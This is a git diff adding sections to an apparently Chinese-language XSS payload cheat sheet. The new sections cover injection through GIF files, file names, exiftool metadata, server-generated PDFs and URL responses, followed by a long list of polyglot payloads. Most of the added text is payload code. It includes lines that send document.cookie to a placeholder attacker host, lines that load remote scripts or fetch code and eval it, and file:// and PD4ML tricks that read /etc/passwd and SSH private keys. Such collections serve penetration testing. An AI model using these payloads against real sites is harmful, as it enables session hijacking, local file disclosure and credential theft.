@@ -306,6 +306,8 @@ payload
 
 ## 8.文件中的XSS
 
+### 文件
+
 (1)png
 
 png.php:
@@ -527,4 +529,174 @@ document.getElementById('btn').onclick = function(e){
 }
 </script>
 </html>
+```
+
+(8)GIF
+
+payload
+```javascript
+GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
+
+example.com/test.php?p=<script src=http://攻击者主机/xss.gif>
+```
+
+### 文件名称或描述
+
+payload
+```javascript
+cp 1.jpg \"\>\<img\ src\ onerror=prompt\(1\)\>.jpg
+"><img src=x onerror=alert(document.domain)>.gif
+<img src=x onerror=alert('XSS')>.png
+"><img src=x onerror=alert('XSS')>.png
+"><svg onmouseover=alert(1)>.svg
+<<script>alert('xss')<!--a-->a.png
+"><svg onload=alert(1)>.gif
+```
+
+元数据
+```bash
+exiftool -FIELD=文件
+exiftool -Artist=' "><img src=1 onerror=alert(document.domain)>' test.jpeg
+exiftool -Artist='"><script>alert(1)</script>' test.jpeg
+```
+
+(9)PDF
+
+如果网页使用用户控制的输出创建动态的PDF文件，那么可以尝试创建包含XSS注入的PDF文档以使其执行
+
+探测
+```javascript
+<img src="x" onerror="document.write('test')" />
+<script>document.write(JSON.stringify(window.location))</script>
+<script>document.write('<iframe src="'+window.location.href+'"></iframe>')</script>
+
+<img src="http:攻击者主机"/>
+<img src=x onerror="location.href='http://攻击者主机/?c='+ document.cookie">
+<script>new Image().src="http://攻击者主机/?c="+encodeURI(document.cookie);</script>
+<link rel=attachment href="http://攻击者主机">
+```
+
+查看路径
+```javascript
+<img src="x" onerror="document.write(window.location)" />
+<script> document.write(window.location) </script>
+<script>document.write(document.location.href)</script>
+```
+
+加载外部脚本
+```javascript
+<script src="http://攻击者主机地址/scripts.js"></script>
+<img src="xasdasdasd" onerror="document.write('<script src="https://攻击者主机地址/test.js"></script>')"/>
+```
+
+读取本地文件
+```javascript
+<script>
+x=new XMLHttpRequest;
+x.onload=function(){document.write(btoa(this.responseText))};
+x.open("GET","file:///etc/passwd");x.send();
+</script>
+```
+
+```javascript
+<script>
+    xhzeem = new XMLHttpRequest();
+    xhzeem.onload = function(){document.write(this.responseText);}
+    xhzeem.onerror = function(){document.write('failed!')}
+    xhzeem.open("GET","file:///etc/passwd");
+    xhzeem.send();
+</script>
+```
+
+```javascript
+<iframe src=file:///etc/passwd></iframe>
+<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+<link rel=attachment href="file:///root/secret.txt">
+<object data="file:///etc/passwd">
+<portal src="file:///etc/passwd" id=portal>
+<embed src="file:///etc/passwd>" width="400" height="400">
+<style><iframe src="file:///etc/passwd">
+<img src='x' onerror='document.write('<iframe src=file:///etc/passwd></iframe>')'/>&text=&width=500&height=500
+<meta http-equiv="refresh" content="0;url=file:///etc/passwd" />
+```
+
+```javascript
+<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
+```
+
+检索SSH密钥
+```javascript
+<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
+```
+
+PD4ML
+
+一些 HTML2 PDF引擎允许为PDF指定附件，例如PD4ML，攻击者可以滥用该功能将任何本地文件附加到PDF
+
+payload
+```javascript
+<html><pd4ml:attachment src="/etc/passwd" description="attachment sample" icon="Paperclip"/></html>
+```
+
+## 9.URL响应
+
+url:
+```javascript
+alert(document.cookie)
+```
+
+payload
+```javascript
+<svg/onload=%27fetch("//攻击者主机地址/url").then(r=>r.text().then(t=>eval(t)))%27>
+```
+
+## 10.多语言
+
+payload
+```javascript
+" onclick=alert(1)//<button ' onclick=alert(1)//> */alert(1)/* " onclick=alert(1)//--><img src=x onerror=alert(1)//></img>
+
+%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
+
+javascript:/*--></title></style></textarea></script></xmp>
+<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
+
+JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//攻击者主机地址\76-->
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
+
+';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
+
+-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
+
+<svg%0Ao%00nload=%09((pro\u006dpt))()//
+
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+
+javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//>
+
+javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
+
+javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>`
+
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
+%3C!%27/!%22/!\%27/\%22/ — !%3E%3C/Title/%3C/script/%3E%3CInput%20Type=Text%20Style=position:fixed;top:0;left:0;font-size:999px%20*/;%20Onmouseenter=confirm1%20//%3E#
+<!'/!”/!\'/\"/ — !></Title/</script/><Input Type=Text Style=position:fixed;top:0;left:0;font-size:999px */; Onmouseenter=confirm1 //>#
+
+"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
+
+<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
 ```
